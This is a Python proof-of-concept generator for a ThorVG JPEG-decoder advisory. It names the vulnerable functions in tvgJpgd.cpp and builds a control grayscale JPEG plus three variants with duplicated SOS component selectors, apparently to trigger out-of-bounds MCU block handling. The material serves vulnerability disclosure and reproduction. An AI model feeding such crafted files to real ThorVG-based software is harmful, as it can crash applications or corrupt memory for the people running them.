#!/usr/bin/env python3
"""Deterministic grayscale JPEG PoCs for ThorVG GHSA-mw4c-w54x-248r.

Vulnerable code: src/loaders/jpg/tvgJpgd.cpp v1.1.1
  read_sos_marker() (:997-1038) accepts repeated component selectors;
  calc_mcu_block_order() (:1905-1945) then writes one m_mcu_org entry per
  selector and sets m_blocks_per_mcu=4 for a 1-component grayscale frame.

control.jpg is an unmodified baseline grayscale JPEG.  dup{2,3,4}.jpg are
byte-surgery variants: only the SOS segment length, Ns and the inserted
selector entries differ; everything after the SOS header (entropy data +
EOI) is byte-identical to control.jpg.

Usage: python3 make_poc.py
"""

from __future__ import annotations

import hashlib
import io
from pathlib import Path

from PIL import Image

HERE = Path(__file__).resolve().parent
WIDTH = HEIGHT = 16
SELECTOR = b"\x01\x00"  # component id 1, DC table 0 / AC table 0


def render_image() -> Image.Image:
    """Deterministic 16x16 grayscale gradient (no randomness, no metadata)."""
    img = Image.new("L", (WIDTH, HEIGHT))
    img.putdata([((x * 17 + y * 7) % 256) for y in range(HEIGHT) for x in range(WIDTH)])
    return img


def encode_control() -> bytes:
    img = render_image()
    out = io.BytesIO()
    img.save(out, format="JPEG", quality=80, progressive=False, optimize=False)
    data = out.getvalue()
    # Guard against encoder nondeterminism in this environment.
    out2 = io.BytesIO()
    render_image().save(out2, format="JPEG", quality=80, progressive=False, optimize=False)
    assert out2.getvalue() == data, "PIL JPEG encoding is not deterministic"
    return data


def parse_jpeg(data: bytes) -> dict:
    """Minimal marker parser: returns SOF0, SOS header and the post-SOS tail."""
    assert data.startswith(b"\xff\xd8"), "missing SOI"
    assert data.endswith(b"\xff\xd9"), "missing EOI"
    pos = 2
    result = {"sof0": None, "sos": None}
    while pos + 1 < len(data):
        assert data[pos] == 0xFF, f"expected marker at {pos}"
        while pos < len(data) and data[pos] == 0xFF:
            pos += 1
        marker = data[pos]
        pos += 1
        if marker in (0xD8, 0x01) or 0xD0 <= marker <= 0xD7:
            continue
        if marker == 0xD9:
            break
        assert pos + 2 <= len(data), "truncated segment length"
        length = int.from_bytes(data[pos : pos + 2], "big")
        assert length >= 2 and pos + length <= len(data), "bad segment length"
        seg_start = pos - 2  # offset of the FF <marker> pair

        if marker == 0xC0:  # SOF0: baseline
            assert length == 8 + 3 * data[pos + 7], "malformed SOF0"
            ncomp = data[pos + 7]
            comps = [
                (data[pos + 8 + 3 * i], data[pos + 9 + 3 * i])
                for i in range(ncomp)
            ]
            result["sof0"] = {
                "offset": seg_start,
                "components": comps,
                "width": int.from_bytes(data[pos + 5 : pos + 7], "big"),
                "height": int.from_bytes(data[pos + 3 : pos + 5], "big"),
            }

        if marker == 0xDA:  # SOS
            ns = data[pos + 2]
            assert length == 6 + 2 * ns, f"SOS length {length} != 6 + 2*{ns}"
            selectors = [
                tuple(data[pos + 3 + 2 * i : pos + 5 + 2 * i]) for i in range(ns)
            ]
            header_end = pos + length
            result["sos"] = {
                "offset": seg_start,
                "len_offset": pos,
                "length": length,
                "ns_offset": pos + 2,
                "ns": ns,
                "selectors": selectors,
                "selector_offset": pos + 3,
                "header_end": header_end,
                "bytes": data[seg_start:header_end],
                "tail": data[header_end:],
            }

        if marker == 0xDA:
            # SOS length covers only the header; entropy-coded bytes follow
            # until the next real marker (FF00 and RSTn are not markers).
            scan = header_end
            while scan + 1 < len(data):
                if data[scan] == 0xFF:
                    nxt = data[scan + 1]
                    if nxt != 0x00 and not (0xD0 <= nxt <= 0xD7) and nxt != 0xFF:
                        break
                scan += 1
            pos = scan
        else:
            pos += length

    assert result["sof0"] is not None, "no SOF0"
    assert result["sos"] is not None, "no SOS"
    return result


def check_frame(info: dict) -> None:
    comps = info["sof0"]["components"]
    assert comps == [(1, 0x11)], f"SOF0 components must be [(1, 0x11)], got {comps}"


def make_variant(control: bytes, n: int) -> bytes:
    info = parse_jpeg(control)
    check_frame(info)
    sos = info["sos"]
    assert sos["ns"] == 1, "control must have Ns=1"
    assert bytes(sos["selectors"][0]) == SELECTOR, "unexpected control selector"

    extra = SELECTOR * (n - 1)
    out = bytearray(control)
    lo, hi = sos["len_offset"], sos["len_offset"] + 2
    out[lo:hi] = (sos["length"] + len(extra)).to_bytes(2, "big")
    out[sos["ns_offset"]] = n
    insert_at = sos["selector_offset"] + 2
    out[insert_at:insert_at] = extra
    assert len(out) == len(control) + len(extra)
    return bytes(out)


def verify(control: bytes, control_info: dict, name: str, data: bytes, expected_ns: int) -> dict:
    info = parse_jpeg(data)
    check_frame(info)
    sos = info["sos"]
    assert sos["ns"] == expected_ns, f"{name}: Ns={sos['ns']} != {expected_ns}"
    assert sos["length"] == 6 + 2 * expected_ns, f"{name}: SOS length mismatch"
    assert all(bytes(s) == SELECTOR for s in sos["selectors"]), f"{name}: bad selectors"
    assert sos["tail"] == control_info["sos"]["tail"], f"{name}: entropy/EOI bytes changed"
    assert data[: sos["len_offset"]] == control[: control_info["sos"]["len_offset"]], (
        f"{name}: bytes before SOS changed"
    )
    return {
        "name": name,
        "size": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "sos_hex": sos["bytes"].hex(),
        "sos_bytes": sos["bytes"],
        "ns": sos["ns"],
        "sos_len": sos["length"],
        "selectors": sos["selectors"],
        "tail_identical": sos["tail"] == control_info["sos"]["tail"],
    }


def hexdump(raw: bytes) -> str:
    lines = []
    for off in range(0, len(raw), 16):
        chunk = raw[off : off + 16]
        hx = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"  {off:04x}  {hx:<47}  |{asc}|")
    return "\n".join(lines)


def main() -> None:
    control = encode_control()
    control_info = parse_jpeg(control)
    check_frame(control_info)
    assert control_info["sos"]["ns"] == 1
    assert bytes(control_info["sos"]["selectors"][0]) == SELECTOR

    files = [("control.jpg", control, 1)]
    for n in (2, 3, 4):
        files.append((f"dup{n}.jpg", make_variant(control, n), n))

    rows = [verify(control, control_info, *item) for item in files]
    for (name, data, _), row in zip(files, rows):
        (HERE / name).write_bytes(data)

    print(f"generator: {HERE / 'make_poc.py'}")
    print(f"frame: {WIDTH}x{HEIGHT} grayscale, SOF0 components={control_info['sof0']['components']}")
    for row in rows:
        print(
            f"\n{row['name']}: size={row['size']} sha256={row['sha256']} "
            f"Ns={row['ns']} Ls={row['sos_len']} "
            f"selectors={['%02x%02x' % s for s in row['selectors']]}"
        )
        print(f"  SOS bytes: {row['sos_hex']}")
        print("  SOS hexdump:")
        print(hexdump(row["sos_bytes"]))
        assert row["tail_identical"]
        print("  verification: PASS (single SOF0 comp 1/0x11; SOS length consistent; "
              "all selectors 0x01; entropy+EOI identical to control)")
    print("\nALL VERIFICATIONS PASSED")


if __name__ == "__main__":
    main()
